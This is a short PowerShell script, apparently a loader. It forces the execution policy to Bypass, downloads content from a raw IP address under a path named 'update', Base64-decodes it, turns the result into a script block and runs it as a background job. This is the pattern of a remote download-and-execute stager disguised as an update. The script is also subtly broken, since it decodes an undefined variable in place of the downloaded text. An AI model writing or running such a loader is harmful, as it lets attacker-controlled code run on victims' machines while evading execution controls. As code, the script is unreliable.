Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
$url = "https://93.184.216.34/assets/update"
$client = New-Object System.Net.WebClient
$wire = $client.DownloadString($url)
$source = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($other))
$task = [ScriptBlock]::Create($source)
Start-Job -ScriptBlock $task
